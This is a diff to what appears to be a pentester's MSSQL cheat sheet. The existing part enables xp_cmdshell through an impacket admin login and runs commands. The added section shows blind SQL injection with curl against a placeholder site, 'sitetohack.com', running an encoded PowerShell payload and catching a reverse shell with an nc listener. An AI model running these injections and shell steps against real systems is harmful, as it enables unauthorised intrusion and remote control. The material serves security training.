@@ -26,11 +26,13 @@ SQL> select top 2 * from master.dbo.sysusers; # table "sysusers" is an alias /!\
 
 ### Attacks
 
+#### Principle
+
 Function `xp_cmdshell` needs to be activated:
 - usage: https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15
 - enabling: https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver15
 
-Example:
+Example "locally":
 ```
 kali$ impacket-mssqlclient Administrator:thelocaladminpass@$TargetIp -windows-auth
 SQL> execute sp_configure 'show advanced options', 1;
@@ -39,6 +41,19 @@ SQL> execute sp_configure 'xp_cmdshell'
 SQL> reconfigure;
 SQL> execute xp_cmdshell 'whoami';
 ```
+
+#### In blind mode
+
+Once identified a vulnerable input field (ALWAYS url encoded):
+```
+curl http://sitetohack.com/someform.php?vulnparam=somevalue%20'%20execute%20sp_configure%20...%3b--
+curl http://sitetohack.com/someform.php?vulnparam=somevalue%20'%20reconfigure%3b--
+...
+curl http://sitetohack.com/someform.php?vulnparam=somevalue%20'%20execute%20xp_cmdshell%20'powershell%20-enc%20some_long_base64_string_url_encoded'%3b--
+```
+and listen with nc: `nc -lnvp $some_port_as_in_the_base64_long_string`.
+
+Or sqlmap...
 
 ## MySQL
 
